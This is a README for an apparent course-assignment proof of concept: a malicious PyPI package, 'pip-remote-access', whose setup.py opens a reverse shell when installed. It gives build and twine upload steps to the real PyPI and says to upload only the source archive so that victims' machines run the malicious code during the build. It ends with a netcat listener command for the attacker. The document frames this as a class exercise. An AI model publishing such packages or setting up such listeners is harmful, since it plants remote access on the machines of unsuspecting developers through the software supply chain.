# Explanation:

This is Simple Python Reverse Shell module. It is a poc of how attackers can exploit `pip install` by publishing a crafed malicious package to Pypi. For CMPT785 course assignment2.



### Build the package:

1. Install the package build process dependencies

​	`python -m pip install --user --upgrade setuptools wheel twine`

2. cd to the directory of setup.py, use this command to build the package

​	`python setup.py sdist bdist_wheel`

3. After build, remember either remove the `.whl` file from `/dist` folder or during the upload process, only upload the `.tar.xz` one. The reason is that we want victims' to build the package themselves in order to get the malicious code execute on victims' machine.  

​	`twine upload dist/*.tar.xz`

4. It will prompt you to enter your username and password in Pypi.org



### Simulate the attack:

Two terminal windows. (If two machines, change the code in setup.py)

Attacker: Listen on 1234 port with netcat`nc -lvp 1234`

Victim: Execute pip install command`pip install pip-remote-access`

We can see in attacker's window, it gets a reverse shell estatblished.
